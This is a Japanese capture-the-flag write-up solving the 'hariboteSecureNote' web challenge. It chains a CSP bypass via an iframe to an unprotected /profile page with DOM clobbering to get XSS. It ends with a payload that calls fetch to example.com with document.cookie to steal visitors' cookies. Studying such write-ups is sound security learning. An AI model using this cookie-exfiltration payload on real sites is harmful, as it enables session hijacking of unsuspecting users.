---
title: "hariboteSecureNote"
points: N/A
tags: ["web"]
---

これはノートアプリ。基本的な機能と、シェアする機能がある。

シェアされたノートはクローラが定期的に見回っているので、 XSSができそうということがわかる。

コードを読むと、この2箇所でXSSが起きそうなことがわかる。上はJavaScriptコンテキスト、下はHTMLのコンテキストで動作する。

```jinja
const printInfo = () => {
    const sharedUserId = "{{ shared_user_id }}";
    const sharedUserName = "{{ shared_user_name }}";
```

```jinja
render({{ notes }})
```

CSPが正しく設定されているので、HTMLのコンテキストで任意のスクリプトを動かすのは難しそう。

そして名前は16文字に制限されているため、JavaScriptのコンテキストでdocument.cookieを参照するのは不可能。

そこで、以下の事実を利用して

- `/profile`というCSPの設定されていないため、このページのコンテキストであればJavaScriptを動作させられる
- DOM Clobberingという手法で、HTMLを用いてJavaScript側から参照可能なグローバル変数を生み出せる


shared_user_nameには、`x.eval(p+''')` を設定し、notesには `<iframe src=/profile id=x><a href="javascript:fetch('example.com?'+document.cookie)">`を設定することで、アクセスした人のcookieを盗み出せる。